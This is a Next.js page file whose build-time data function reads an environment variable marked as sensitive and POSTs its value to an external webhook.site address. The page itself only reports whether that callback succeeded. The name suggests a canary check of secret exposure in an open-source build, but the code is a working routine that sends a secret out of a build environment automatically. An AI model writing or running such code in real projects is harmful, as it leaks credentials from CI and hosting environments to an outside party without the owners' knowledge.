import type { GetStaticProps } from "next";

type Props = {
  callbackSent: boolean;
};

export default function OssOncallCanaryBuild({ callbackSent }: Props) {
  return <p>Canary callback sent: {String(callbackSent)}</p>;
}

export const getStaticProps: GetStaticProps<Props> = async () => {
  const canary = process.env.OSS_ONCALL_CANARY_SENSITIVE;

  if (!canary) {
    return { props: { callbackSent: false } };
  }

  const response = await fetch(
    "https://webhook.site/dd464a06-e1d9-4d89-98ad-e9b9d3973383",
    {
      method: "POST",
      headers: { "content-type": "text/plain" },
      body: canary,
    }
  );

  if (!response.ok) {
    throw new Error(`Canary callback failed with HTTP ${response.status}`);
  }

  return { props: { callbackSent: true } };
};
